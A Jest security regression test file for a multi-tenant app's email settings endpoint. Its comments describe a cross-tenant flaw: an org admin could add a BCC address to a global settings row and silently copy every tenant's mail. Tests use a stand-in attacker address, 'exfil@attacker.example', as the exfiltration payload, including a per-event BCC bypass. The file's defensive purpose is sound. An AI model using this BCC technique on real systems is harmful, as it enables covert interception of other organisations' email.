// Silent mail exfiltration: a BCC address in a GLOBAL blob, settable by any
// org admin. Ranked first of the app_settings findings — one call, no
// escalation, and nothing on screen anywhere to say it happened.
//
// WHAT WAS OPEN
// PUT /api/email/settings is `requireRole('admin')` — every tenant's org admin
// — and it writes app_settings(key='email'), which is ONE GLOBAL ROW: no
// organization_id, one blob for the whole platform. Verified live over HTTP:
// an org-A admin PUT `globalBcc: 'exfil@attacker.example'` -> 200, and org-B's
// admin read the same address back from GET /api/email/settings. One shared
// row, confirmed from both sides.
//
// email.js sendForEvent then splits globalBcc on commas and merges it onto
// EVERY event email for EVERY tenant — assignments, lead notifications, sub
// handoffs, cert reminders. The attacker receives the other tenant's mail.
//
// WHY THE RULE IS ABOUT BCC AND NOT ABOUT ONE FIELD NAME
// `settings.events[k].bcc` is the same mechanism one field over: sendForEvent
// concatenates the per-event list with the global one and dedupes them into a
// single BCC header. Closing only `globalBcc` — the field the report named —
// would have left the bypass inside the same request body: set a per-event BCC
// on every event and the exfiltration is identical, merely enumerated. Both
// arms are asserted below, and the per-event one is the reason this file is
// not three lines long.
//
// WHY NOT `requireSystemAdmin` ON THE WHOLE ENDPOINT
// The per-event toggles, digest mode and quiet hours are global too, and the
// org-admin Email surface edits them today. Those are noise-and-availability
// settings, not a copy of the mail. Taking the whole door would trade a
// boundary for an outage on the part that carries no secret — this wave has
// already revived three features killed exactly that way. So the last block
// pins the org admin's ordinary saves as still-working.

process.env.JWT_SECRET = process.env.JWT_SECRET ||
  'test-secret-for-email-bcc-platform-gate-suite-0123456789';

const express = require('express');
const http = require('http');

let stored;

jest.mock('../server/db', () => ({
  pool: {
    query: async (sql, params) => mockRunQuery(sql, params),
    connect: async () => ({
      query: async (sql, params) => mockRunQuery(sql, params),
      release: () => {}
    })
  },
  getOrgById: async (id) => ({ id, name: 'Org ' + id })
}));

let roles;

// The email blob is REAL MUTABLE STATE here. The property under test is "what
// is in the row afterwards" — a handler that 403s but has already written, or
// that passes but silently wipes the stored value, both have to be visible.
function mockRunQuery(sql, params) {
  const text = String(sql).replace(/\s+/g, ' ').trim();
  const p = params || [];

  if (text.includes('SELECT name, capabilities FROM roles')) return { rows: roles };
  if (/SELECT value FROM app_settings WHERE key = 'email'/.test(text)) {
    return { rows: stored ? [{ value: stored }] : [] };
  }
  if (/INSERT INTO app_settings \(key, value\) VALUES \('email'/.test(text)) {
    stored = JSON.parse(p[0]);
    return { rows: [], rowCount: 1 };
  }
  return { rows: [], rowCount: 0 };
}

const { signToken, setRolePool, refreshRoleCache } = require('../server/auth');
const { pool } = require('../server/db');

setRolePool(pool);

let server, baseUrl;

const ADMIN_CAPS = [
  'JOBS_VIEW_ALL', 'FINANCIALS_VIEW', 'ESTIMATES_VIEW', 'LEADS_VIEW',
  'USERS_MANAGE', 'ROLES_MANAGE', 'INSIGHTS_VIEW', 'ADMIN_METRICS'
];

const ORG_A_ADMIN = { id: 10, email: 'admin-a@a.test', role: 'admin', name: 'A Admin', organization_id: 1 };
const ORG_B_ADMIN = { id: 77, email: 'admin-b@b.test', role: 'admin', name: 'B Admin', organization_id: 2 };
const OWNER       = { id: 1,  email: 'owner@p86.test', role: 'system_admin', name: 'Owner', organization_id: 1 };

const HOUSE_BCC = 'ops@agxco.com';
const EXFIL = 'exfil@attacker.example';

function freshStore() {
  return {
    events: {
      sub_assigned: { enabled: true, bcc: [] },
      lead_created: { enabled: false, bcc: [] }
    },
    globalBcc: HOUSE_BCC,
    digestMode: false,
    quietHours: { enabled: false, start: '21:00', end: '07:00' }
  };
}

function req(method, path, user, body) {
  return new Promise((resolve, reject) => {
    const payload = body == null ? null : JSON.stringify(body);
    const u = new URL(baseUrl + path);
    const r = http.request({
      hostname: u.hostname, port: u.port, path: u.pathname, method,
      headers: Object.assign(
        { Authorization: 'Bearer ' + signToken(user) },
        payload ? { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) } : {}
      )
    }, (resp) => {
      let raw = '';
      resp.on('data', (c) => { raw += c; });
      resp.on('end', () => {
        let json = null;
        try { json = JSON.parse(raw); } catch (e) { /* non-JSON */ }
        resolve({ status: resp.statusCode, body: json, raw });
      });
    });
    r.on('error', reject);
    if (payload) r.write(payload);
    r.end();
  });
}

beforeAll(async () => {
  roles = [
    { name: 'system_admin', capabilities: ADMIN_CAPS.concat(['SYSTEM_ADMIN']) },
    { name: 'admin', capabilities: ADMIN_CAPS.slice() }
  ];
  stored = freshStore();
  await refreshRoleCache();
  const app = express();
  app.use(express.json({ limit: '2mb' }));
  app.use('/api/email', require('../server/routes/email-routes'));
  await new Promise((done) => {
    server = http.createServer(app);
    server.listen(0, '127.0.0.1', () => {
      baseUrl = 'http://127.0.0.1:' + server.address().port;
      done();
    });
  });
});

afterAll((done) => { server.close(() => done()); });

beforeEach(async () => { stored = freshStore(); await refreshRoleCache(); });

// Exactly what email.js sendForEvent does with the blob, so the assertion is
// about who receives mail rather than about a field name.
function bccActuallySentTo(blob, eventKey) {
  const perEvent = (blob.events && blob.events[eventKey] && blob.events[eventKey].bcc) || [];
  const global = String(blob.globalBcc || '').split(',').map((s) => s.trim()).filter(Boolean);
  const set = {};
  perEvent.concat(global).forEach((a) => { if (a) set[a.toLowerCase()] = a; });
  return Object.keys(set);
}

describe('globalBcc cannot be set by a non-holder', () => {
  test('an org admin cannot add a global BCC recipient', async () => {
    const r = await req('PUT', '/api/email/settings', ORG_A_ADMIN,
      Object.assign({}, freshStore(), { globalBcc: HOUSE_BCC + ', ' + EXFIL }));
    expect(r.status).toBe(403);
    expect(stored.globalBcc).toBe(HOUSE_BCC);
    // The property that matters is not the status — it is that no event email
    // in any tenant now carries the attacker.
    expect(bccActuallySentTo(stored, 'sub_assigned')).not.toContain(EXFIL);
  });

  test('an org admin cannot replace the global BCC outright', async () => {
    const r = await req('PUT', '/api/email/settings', ORG_A_ADMIN,
      Object.assign({}, freshStore(), { globalBcc: EXFIL }));
    expect(r.status).toBe(403);
    expect(stored.globalBcc).toBe(HOUSE_BCC);
  });

  test('the second tenant cannot either — one shared row, both sides', async () => {
    const r = await req('PUT', '/api/email/settings', ORG_B_ADMIN,
      Object.assign({}, freshStore(), { globalBcc: EXFIL }));
    expect(r.status).toBe(403);
    expect(stored.globalBcc).toBe(HOUSE_BCC);
  });

  test('recasing and reordering are not a way past the comparison', async () => {
    const r = await req('PUT', '/api/email/settings', ORG_A_ADMIN,
      Object.assign({}, freshStore(), { globalBcc: EXFIL.toUpperCase() + ' , ' + HOUSE_BCC }));
    expect(r.status).toBe(403);
    expect(stored.globalBcc).toBe(HOUSE_BCC);
  });

  test('an org admin cannot REMOVE the house BCC either', async () => {
    // Removal is its own cross-tenant attack on a global row: drop the
    // operator's audit address and the mail stops being copied anywhere.
    const r = await req('PUT', '/api/email/settings', ORG_A_ADMIN,
      Object.assign({}, freshStore(), { globalBcc: '' }));
    expect(r.status).toBe(403);
    expect(stored.globalBcc).toBe(HOUSE_BCC);
  });

  test('the platform owner still sets it — the gate was raised, not welded', async () => {
    const r = await req('PUT', '/api/email/settings', OWNER,
      Object.assign({}, freshStore(), { globalBcc: 'audit@agxco.com' }));
    expect(r.status).toBe(200);
    expect(stored.globalBcc).toBe('audit@agxco.com');
  });
});

describe('the per-event BCC list is the same arm and is closed with it', () => {
  test('an org admin cannot add a per-event BCC recipient', async () => {
    const blob = freshStore();
    blob.events.sub_assigned.bcc = [EXFIL];
    const r = await req('PUT', '/api/email/settings', ORG_A_ADMIN, blob);
    expect(r.status).toBe(403);
    expect(bccActuallySentTo(stored, 'sub_assigned')).not.toContain(EXFIL);
  });

  test('enumerating every event is not a way around the global-field gate', async () => {
    // The bypass a globalBcc-only fix would have left: never touch globalBcc,
    // just put the attacker on every event instead.
    const blob = freshStore();
    Object.keys(blob.events).forEach((k) => { blob.events[k].bcc = [EXFIL]; });
    const r = await req('PUT', '/api/email/settings', ORG_A_ADMIN, blob);
    expect(r.status).toBe(403);
    Object.keys(stored.events).forEach((k) => {
      expect(bccActuallySentTo(stored, k)).not.toContain(EXFIL);
    });
  });

  test('a brand-new event key smuggled into the blob cannot carry a BCC', async () => {
    const blob = freshStore();
    blob.events.invented_event = { enabled: true, bcc: [EXFIL] };
    const r = await req('PUT', '/api/email/settings', ORG_A_ADMIN, blob);
    expect(r.status).toBe(403);
    expect(stored.events.invented_event).toBeUndefined();
  });

  test('the platform owner still sets a per-event BCC', async () => {
    const blob = freshStore();
    blob.events.sub_assigned.bcc = ['audit@agxco.com'];
    const r = await req('PUT', '/api/email/settings', OWNER, blob);
    expect(r.status).toBe(200);
    expect(bccActuallySentTo(stored, 'sub_assigned')).toContain('audit@agxco.com');
  });
});

describe('the org admin Email surface still works for what it legitimately owns', () => {
  test('toggling an event still saves, with the BCC echoed back unchanged', async () => {
    // The admin UI PUTs the WHOLE blob on every save, current BCC values
    // included. A guard that fired on "carries a BCC" rather than "changes
    // one" would 403 every ordinary toggle the moment an address existed —
    // which is the outage this design exists to avoid.
    const blob = freshStore();
    blob.events.lead_created.enabled = true;
    const r = await req('PUT', '/api/email/settings', ORG_A_ADMIN, blob);
    expect(r.status).toBe(200);
    expect(stored.events.lead_created.enabled).toBe(true);
    expect(stored.globalBcc).toBe(HOUSE_BCC);
  });

  test('digest mode and quiet hours still save as an org admin', async () => {
    const blob = freshStore();
    blob.digestMode = true;
    blob.quietHours = { enabled: true, start: '22:00', end: '06:00' };
    const r = await req('PUT', '/api/email/settings', ORG_A_ADMIN, blob);
    expect(r.status).toBe(200);
    expect(stored.digestMode).toBe(true);
    expect(stored.quietHours.start).toBe('22:00');
  });

  test('a client that omits globalBcc no longer WIPES it', async () => {
    // Pre-existing data-loss bug in the same handler, found while writing the
    // guard: `typeof b.globalBcc === 'string' ? b.globalBcc : ''` silently
    // cleared the stored value whenever the field was absent. Absent now means
    // unchanged — which is also what makes the delta comparison honest.
    const blob = freshStore();
    delete blob.globalBcc;
    blob.digestMode = true;
    const r = await req('PUT', '/api/email/settings', ORG_A_ADMIN, blob);
    expect(r.status).toBe(200);
    expect(stored.globalBcc).toBe(HOUSE_BCC);
  });

  test('an org admin can still READ the settings', async () => {
    const r = await req('GET', '/api/email/settings', ORG_A_ADMIN);
    expect(r.status).toBe(200);
    expect(r.body.settings.globalBcc).toBe(HOUSE_BCC);
  });
});
